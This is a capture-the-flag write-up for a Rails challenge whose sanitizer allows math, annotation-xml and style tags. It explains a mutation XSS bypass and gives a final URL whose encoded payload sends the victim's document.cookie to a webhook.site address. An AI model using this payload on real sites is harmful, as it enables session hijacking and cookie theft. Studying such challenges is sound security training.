+++
title = "Flavourless"  
date = 2025-07-06  
authors = ["Abizer Lokhandwala"]  
+++

---

### Premise

This is a very simple page. It shows our input with some sanitization, but it allows `<math>`, `<annotation-xml>`, and `<style>` tags.

```ruby
class FlavourController < ApplicationController
  include ActionView::Helpers::SanitizeHelper
  def index
    user_input = params[:input]

    @sanitized_input = sanitize(user_input, tags: [ "math", "annotation-xml", "style" ])
  end
end
```

---

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Flavour Rater</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background: linear-gradient(135deg, #1a1a1a 0%, #2b2b2b 100%);
      min-height: 100vh;
      font-family: 'Inter', sans-serif;
      color: #ffffff;
    }
    .glow-text {
      text-shadow: 0 0 10px rgba(255, 135, 0, 0.7);
    }
    .custom-container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 135, 0, 0.3);
    }
    .code-block {
      background: #2d2d2d;
      padding: 0.25rem 0.5rem;
      border-radius: 0.25rem;
    }
  </style>
</head>
<body class="flex items-center justify-center p-4">
  <div class="custom-container rounded-2xl shadow-2xl p-8 max-w-2xl w-full">
    <h1 class="text-4xl font-bold text-orange-500 glow-text text-center mb-6">Flavour Less ;)</h1>

    <% if @sanitized_input.present? %>
      <p class="font-semibold text-orange-400 mb-2">Sanitized Output:</p>
      <div class="p-4 bg-gray-900 rounded-lg text-white">
        <%= raw @sanitized_input %>
      </div>
    <% else %>
      <p class="text-gray-300">No input provided. Please add a query parameter, e.g., <code class="code-block">?input=...</code>.</p>
    <% end %>
  </div>
</body>
</html>
```

---

### Analysis

This was a simple **mutation XSS** question.  
We can just try some default methods and payloads.

Basically:

```html
<math><annotation-xml encoding="text/html"><style><img src onerror=alert(origin)>
```

will confuse the browser on what is and isn’t code to be executed, and will **execute the `onerror` part**. This is called **mutation injection**.

---

### Final Solution

```
http://localhost:3000/report?url=http%3A%2F%2Flocalhost%3A3000%2F%3Finput%3D%253Cmath%253E%253Cannotation-xml%2520encoding%3D%2522text%2Fhtml%2522%253E%253Cstyle%253E%253Cimg%2520src%2520onerror%3D%2522window.location.href%3D%2527https%3A%2F%2Fwebhook.site%2F966f7699-02fe-4b89-ab1c-86aae18d86d6%3Fcookie%3D%2527%252BencodeURIComponent%28document.cookie%29%3B%2522%253E
```

